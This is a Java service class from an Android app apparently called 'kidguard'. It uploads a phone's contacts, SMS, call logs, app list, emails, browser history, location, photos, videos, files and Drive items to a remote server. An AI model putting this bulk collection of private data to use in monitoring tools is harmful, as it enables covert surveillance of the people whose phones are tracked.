package com.kidguard.services;


import android.support.annotation.NonNull;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.kidguard.LogInActivity;
import com.kidguard.interfaces.Constant;
import com.kidguard.interfaces.RestClient;
import com.kidguard.model.Files;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Images;
import com.kidguard.model.Video;
import com.kidguard.pojo.ApiResponsePOJO;
import com.kidguard.pojo.AppPOJO;
import com.kidguard.pojo.BrowserHistoryPOJO;
import com.kidguard.pojo.CallPOJO;
import com.kidguard.pojo.ContactPOJO;
import com.kidguard.pojo.DrivePOJO;
import com.kidguard.pojo.EmailPOJO;
import com.kidguard.pojo.FilePOJO;
import com.kidguard.pojo.ImagePOJO;
import com.kidguard.pojo.LocationPOJO;
import com.kidguard.pojo.LogInPOJO;
import com.kidguard.pojo.SmsPOJO;
import com.kidguard.pojo.VideoPOJO;
import com.kidguard.utilities.ApiClient;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

@SuppressWarnings("all")
public class RestClientService implements Constant {

    private static final String TAG = RestClientService.class.getSimpleName();
    private int j = 0;

    // Constructor For Contacts, Calls, Sms, Apps, Emails
    public RestClientService(@NonNull String tag, @NonNull String token, @NonNull String data) {
        RestClient restClientAPI = new ApiClient(tag).getClient();

        if (tag.equals(TAG_CONTACTS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendContactsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "CONTACT_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "CONTACT_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "CONTACT_FAILED_CODE_ERROR_404,505??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With ContactPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_SMS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendSmsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "SMS_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "SMS_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "SMS_FAILED_CODE_ERROR_404,505??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With SmsPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_CALLS)) {
            Call<CallPOJO> call = restClientAPI.sendCallsToServer(token, data);
            Callback<CallPOJO> callback = new Callback<CallPOJO>() {

                @Override
                public void onResponse(Call<CallPOJO> call, Response<CallPOJO> response) {
                    CallPOJO callPOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (callPOJO.getSuccess() == SUCCESS) {

                            Log.e(TAG, "CALL_TRUE??" + callPOJO.getSuccess());

                        } else {

                            Log.e(TAG, "CALL_FALSE??" + callPOJO.getSuccess());

                        }
                    } else {
                        Log.e(TAG, "CALL_FAILED_CODE_ERROR_404,505??" + code);
                    }
                }

                @Override
                public void onFailure(Call<CallPOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With CALLPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_LIST_APPS)) {
            Call<AppPOJO> call = restClientAPI.sendAppsToServer(token, data);
            Callback<AppPOJO> callback = new Callback<AppPOJO>() {

                @Override
                public void onResponse(Call<AppPOJO> call, Response<AppPOJO> response) {
                    AppPOJO appPOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (appPOJO.getSuccess() == SUCCESS) {

                            Log.e(TAG, "APP_TRUE??" + appPOJO.getSuccess());

                        } else {

                            Log.e(TAG, "APP_FALSE??" + appPOJO.getSuccess());

                        }
                    } else {
                        Log.e(TAG, "APP_FAILED_CODE_ERROR_404,505??" + code);
                    }
                }

                @Override
                public void onFailure(Call<AppPOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With APPPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_EMAIL)) {
            Call<EmailPOJO> call = restClientAPI.sendEmailsToServer(token, data);
            Callback<EmailPOJO> callback = new Callback<EmailPOJO>() {
                @Override
                public void onResponse(Call<EmailPOJO> call, Response<EmailPOJO> response) {
                    EmailPOJO emailPOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (emailPOJO.getSuccess() == SUCCESS) {

                            Log.e(TAG, "EMAIL_TRUE??" + emailPOJO.getSuccess());

                        } else {

                            Log.e(TAG, "EMAIL_FALSE??" + emailPOJO.getSuccess());

                        }
                    } else {
                        Log.e(TAG, "EMAIL_FAILED_CODE_ERROR_404??" + code);
                    }
                }

                @Override
                public void onFailure(Call<EmailPOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With EMAILPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            Call<BrowserHistoryPOJO> call = restClientAPI.sendBrowserHistoryToServer(token, data);
            Callback<BrowserHistoryPOJO> callback = new Callback<BrowserHistoryPOJO>() {
                @Override
                public void onResponse(Call<BrowserHistoryPOJO> call, Response<BrowserHistoryPOJO> response) {
                    BrowserHistoryPOJO browserHistoryPOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (browserHistoryPOJO.getSuccess() == SUCCESS) {

                            Log.e(TAG, "BrowserHistory_TRUE??" + browserHistoryPOJO.getSuccess());

                        } else {

                            Log.e(TAG, "BrowserHistory_FALSE??" + browserHistoryPOJO.getSuccess());

                        }
                    } else {
                        Log.e(TAG, "BrowserHistory_FAILED_CODE_ERROR_404??" + code);
                    }
                }

                @Override
                public void onFailure(Call<BrowserHistoryPOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With BrowserHistoryPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_LOCATION)) {
            Call<LocationPOJO> call = restClientAPI.sendLocationToServer(token, data);
            Callback<LocationPOJO> callback = new Callback<LocationPOJO>() {
                @Override
                public void onResponse(Call<LocationPOJO> call, Response<LocationPOJO> response) {
                    LocationPOJO locationPojo = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (locationPojo.getSuccess() == SUCCESS) {

                            Log.e(TAG, "Location_TRUE??" + locationPojo.getSuccess());

                        } else {

                            Log.e(TAG, "Location_FALSE??" + locationPojo.getSuccess());

                        }
                    } else {
                        Log.e(TAG, "Location_FAILED_CODE_ERROR_404??" + code);
                    }
                }

                @Override
                public void onFailure(Call<LocationPOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With LocationPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }
    }

    // Constructor For Images, Videos, Files, Drive
    public <T> RestClientService(@NonNull String tag, @NonNull String token,
                                 @NonNull Collection<T> lst) {

        RestClient restClientAPI = new ApiClient(tag).getClient();

        if (tag.equals(TAG_IMAGES)) {
            ArrayList<Images> lstImages = (ArrayList<Images>) lst;

            if (lstImages != null && lstImages.size() > 0) {

                sendImage(j, lstImages, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_VIDEOS)) {
            ArrayList<Video> lstVideo = (ArrayList<Video>) lst;

            if (lstVideo != null && lstVideo.size() > 0) {

                sendVideo(j, lstVideo, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_FILES)) {
            ArrayList<Files> lstFile = (ArrayList<Files>) lst;

            if (lstFile != null && lstFile.size() > 0) {

                sendFiles(j, lstFile, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            ArrayList<GoogleDrive> lstGoogleDrive = (ArrayList<GoogleDrive>) lst;

            if (lstGoogleDrive != null && lstGoogleDrive.size() > 0) {

                sendGoogleDrive(j, lstGoogleDrive, restClientAPI, token);
            }
        }
    }

    /* sendImage */
    private void sendImage(final int i, final ArrayList<Images> lstImages, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("image", new File(lstImages.get(i).getImagePath()));

        // create a map of data to pass along
        RequestBody imageName = createPartFromString(lstImages.get(i).getImageName());
        RequestBody imageSizeMB = createPartFromString(lstImages.get(i).getSizeMB());
        RequestBody imageSizeKB = createPartFromString(lstImages.get(i).getSizeKB());
        RequestBody imageDateTime = createPartFromString(lstImages.get(i).getDateTime());
        RequestBody imageDateTimeStamp = createPartFromString(lstImages.get(i).getDateTimeStamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("imageName", imageName);
        map.put("imageSizeMB", imageSizeMB);
        map.put("imageSizeKB", imageSizeKB);
        map.put("imageDateTime", imageDateTime);
        map.put("imageDateTimeStamp", imageDateTimeStamp);

        // finally, execute the request
        Call<ImagePOJO> call = restClientAPI.sendImageToServer(token, map, body);
        Callback<ImagePOJO> callback = new Callback<ImagePOJO>() {
            @Override
            public void onResponse(Call<ImagePOJO> call, Response<ImagePOJO> response) {
                ImagePOJO imagePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (imagePOJO.getSuccess() == SUCCESS) {

                        Log.e(TAG, "IMAGE_TRUE??" + imagePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstImages.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_IMAGES).getClient();
                            sendImage(j, lstImages, restClientAPI, token);
                        }

                    } else {

                        Log.e(TAG, "IMAGE_FALSE??" + imagePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstImages.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_IMAGES).getClient();
                            sendImage(j, lstImages, restClientAPI, token);
                        }
                    }

                } else {
                    Log.e(TAG, "IMAGE_FAILED_CODE_ERROR_404_505??" + code);
                    if (i == 0) {

                        j++;

                    } else {

                        j++;

                    }

                    if (lstImages.size() != j) {
                        RestClient restClientAPI = new ApiClient(TAG_IMAGES).getClient();
                        sendImage(j, lstImages, restClientAPI, token);
                    }
                }
            }

            @Override
            public void onFailure(Call<ImagePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With IMAGEPOJO>>>" + t.getMessage());
            }
        };

        call.enqueue(callback);
    }

    /* Send Video */
    private void sendVideo(final int i, final ArrayList<Video> lstVideos, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("video", new File(lstVideos.get(i).getVideoPath()));

        // create a map of data to pass along
        RequestBody videoName = createPartFromString(lstVideos.get(i).getVideoname());
        RequestBody videoSizeKB = createPartFromString(lstVideos.get(i).getVideoSizeKB());
        RequestBody videoSizeMB = createPartFromString(lstVideos.get(i).getVideoSizeMB());
        RequestBody videoDateTime = createPartFromString(lstVideos.get(i).getDate_time());
        RequestBody videoDateTimeStamp = createPartFromString(lstVideos.get(i).getDate_time_stamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("videoName", videoName);
        map.put("videoSizeKB", videoSizeKB);
        map.put("videoSizeMB", videoSizeMB);
        map.put("videoDateTime", videoDateTime);
        map.put("videoDateTimeStamp", videoDateTimeStamp);


        // finally, execute the request
        Call<VideoPOJO> call = restClientAPI.sendVideoToServer(token, map, body);
        Callback<VideoPOJO> callback = new Callback<VideoPOJO>() {

            @Override
            public void onResponse(Call<VideoPOJO> call, Response<VideoPOJO> response) {
                VideoPOJO videoPOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (videoPOJO.getSuccess() == SUCCESS) {

                        Log.e(TAG, "Video_TRUE??" + videoPOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstVideos.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_VIDEOS).getClient();
                            sendVideo(j, lstVideos, restClientAPI, token);
                        }

                    } else {

                        Log.e(TAG, "Video_FALSE??" + videoPOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstVideos.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_VIDEOS).getClient();
                            sendVideo(j, lstVideos, restClientAPI, token);
                        }
                    }

                } else {
                    Log.e(TAG, "Video_FAILED_CODE_ERROR_404_505??" + code);
                    if (i == 0) {

                        j++;

                    } else {

                        j++;

                    }

                    if (lstVideos.size() != j) {
                        RestClient restClientAPI = new ApiClient(TAG_VIDEOS).getClient();
                        sendVideo(j, lstVideos, restClientAPI, token);
                    }
                }
            }

            @Override
            public void onFailure(Call<VideoPOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With VideoPOJO>>>" + t.getMessage());
            }
        };

        call.enqueue(callback);
    }

    /* Send Files To Server */
    private void sendFiles(final int i, final ArrayList<Files> lstFiles, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("file", new File(lstFiles.get(i).getFilePath()));

        // create a map of data to pass along
        RequestBody fileName = createPartFromString(lstFiles.get(i).getFilename());
        RequestBody fileSizeKB = createPartFromString(lstFiles.get(i).getFileSizeKB());
        RequestBody fileSizeMB = createPartFromString(lstFiles.get(i).getFileSizeMB());
        RequestBody fileDateTime = createPartFromString(lstFiles.get(i).getDate_time());
        RequestBody fileDateTimeStamp = createPartFromString(lstFiles.get(i).getDate_time_stamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("fileName", fileName);
        map.put("fileSizeKB", fileSizeKB);
        map.put("fileSizeMB", fileSizeMB);
        map.put("fileDateTime", fileDateTime);
        map.put("fileDateTimeStamp", fileDateTimeStamp);

        // finally, execute the request
        Call<FilePOJO> call = restClientAPI.sendFilesToServer(token, map, body);
        Callback<FilePOJO> callback = new Callback<FilePOJO>() {
            @Override
            public void onResponse(Call<FilePOJO> call, Response<FilePOJO> response) {
                FilePOJO filePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {

                    if (filePOJO.getSuccess() == SUCCESS) {
                        Log.e(TAG, "Files_TRUE??" + filePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstFiles.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_FILES).getClient();
                            sendFiles(j, lstFiles, restClientAPI, token);
                        }

                    } else {

                        Log.e(TAG, "Files_FALSE??" + filePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstFiles.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_FILES).getClient();
                            sendFiles(j, lstFiles, restClientAPI, token);
                        }
                    }

                } else {
                    Log.e(TAG, "Files_FAILED_CODE_ERROR_404_505??" + code);
                    if (i == 0) {

                        j++;

                    } else {

                        j++;

                    }

                    if (lstFiles.size() != j) {
                        RestClient restClientAPI = new ApiClient(TAG_FILES).getClient();
                        sendFiles(j, lstFiles, restClientAPI, token);
                    }
                }
            }

            @Override
            public void onFailure(Call<FilePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With FilePOJO>>>" + t.getMessage());
            }
        };

        call.enqueue(callback);
    }

    /* Send GoogleDrive To Server */
    private void sendGoogleDrive(final int i, final ArrayList<GoogleDrive> lstDrive, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("drive", new File(lstDrive.get(i).getFileDownloadUrl()));

        // create a map of data to pass along
        RequestBody driveFileName = createPartFromString(lstDrive.get(i).getFileTitle());
        RequestBody driveFileSize = createPartFromString(lstDrive.get(i).getFileSize());
        RequestBody driveFileDate = createPartFromString(lstDrive.get(i).getFileDate());
        RequestBody driveFileId = createPartFromString(lstDrive.get(i).getFileId());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("driveFileId", driveFileId);
        map.put("driveFileName", driveFileName);
        map.put("driveFileSize", driveFileSize);
        map.put("driveFileDate", driveFileDate);

        // finally, execute the request
        Call<DrivePOJO> call = restClientAPI.sendDriveToServer(token, map, body);
        Callback<DrivePOJO> callback = new Callback<DrivePOJO>() {
            @Override
            public void onResponse(Call<DrivePOJO> call, Response<DrivePOJO> response) {
                DrivePOJO drivePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (drivePOJO.getSuccess() == SUCCESS) {

                        Log.e(TAG, "Drive_TRUE??" + drivePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstDrive.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_GOOGLE_DRIVE).getClient();
                            sendGoogleDrive(j, lstDrive, restClientAPI, token);
                        }

                    } else {

                        Log.e(TAG, "Drive_FALSE??" + drivePOJO.getSuccess());
                        if (i == 0) {

                            j++;

                        } else {

                            j++;

                        }

                        if (lstDrive.size() != j) {
                            RestClient restClientAPI = new ApiClient(TAG_GOOGLE_DRIVE).getClient();
                            sendGoogleDrive(j, lstDrive, restClientAPI, token);
                        }
                    }

                } else {
                    Log.e(TAG, "Drive_FAILED_CODE_ERROR_404_505??" + code);
                    if (i == 0) {

                        j++;

                    } else {

                        j++;

                    }

                    if (lstDrive.size() != j) {
                        RestClient restClientAPI = new ApiClient(TAG_GOOGLE_DRIVE).getClient();
                        sendGoogleDrive(j, lstDrive, restClientAPI, token);
                    }
                }
            }

            @Override
            public void onFailure(Call<DrivePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With DrivePOJO>>>" + t.getMessage());
            }
        };

        call.enqueue(callback);
    }

    @NonNull
    private RequestBody createPartFromString(String descriptionString) {
        return RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), descriptionString);
    }

    @NonNull
    private MultipartBody.Part prepareFilePart(String partName, File file) {
        // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
        RequestBody requestFile = RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), file);

        // MultipartBody.Part is used to send also the actual file name
        return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
    }
}
